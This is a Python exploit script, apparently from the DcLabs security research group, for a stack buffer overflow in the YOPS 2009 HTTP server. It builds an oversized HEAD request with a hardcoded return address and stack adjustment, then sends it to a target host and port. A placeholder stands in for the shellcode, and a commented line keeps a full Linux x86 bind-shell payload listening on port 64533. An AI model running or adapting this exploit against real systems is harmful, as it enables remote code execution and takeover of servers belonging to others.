# Software:
# YOPS (Your Own Personal [WEB] Server) is a small SEDA-like HTTP
#server for Linux OS written in C.
# URL: http://sourceforge.net/projects/yops2009/
#
# Vulnerability: Rodrigo Escobar aka ipax @ DcLabs
# Exploit: Flavio do Carmo Junior aka waKKu @ DcLabs
# Contact: waKKu <AT> dclabs <DOT> com <DOT> br
#!/usr/bin/python

#!/usr/bin/python
import sys

#HOST = "localhost"
HOST = sys.argv[1]
#PORT = 8888
PORT = int(sys.argv[2])
import socket
import sys
import time

try:
	BUFF_LEN = int(sys.argv[3])
except:
	BUFF_LEN = 802
FIXUP_ADDR = "\x47\xce\x04\x08"


# Shellcode changed for winAUTOPWN by QUAKERDOOMER

#by Magnefikko
#	05.07.2010
#	magnefikko@gmail.com
#	Promhyl Studies :: http://promhyl.tk
#	Subgroup: #PRekambr
#	Name: 97 bytes bind sh@64533
#	Platform: Linux x86

shellcode = ("SHALL BE CHANGED BY WINDOWS AUTOPWN")
#("\x6a\x66\x6a\x01\x5b\x58\x99\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\xfc\x15\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x66\x58\x43\x43\x6a\x05\x56\xcd\x80\x6a\x66\x58\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x6a\x3f\x58\x31\xc9\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80")
 


buffer = "HEAD "
buffer += "A"*BUFF_LEN
buffer += FIXUP_ADDR*4
buffer += " HTTP/1.1"

stackadjust = (
		"\xcb" # instruction alignment
		"\xbc\x69\x69\x96\xb0" # Stack Adjustment
)

payload = buffer + stackadjust + shellcode + "\r\n\r\n"

print """
######################################
### DcLabs Security Research Group ###
###            +Exploit+           ###
######################################
Software: YOPS 2009 - Web Server
---
Vulnerability by: ipax
Exploit by: waKKu
Greetings to: All DcLabs members
"""

print " [+] Using BUFF_LEN -> ", str(BUFF_LEN)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print " [+] Trying to establish connection..."
s.connect((HOST, PORT))
print " [+] Sending a dummy request to initialize data..."
s.send("HEAD DcLabs HTTP/1.1\r\n\r\n")
try:
	s.recv(1024)
except:
	pass
s.close()

time.sleep(3)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
print " [+] Sending our malicious payload..."
s.send(payload)
print " [+] Payload sent, good luck!"
s.close()

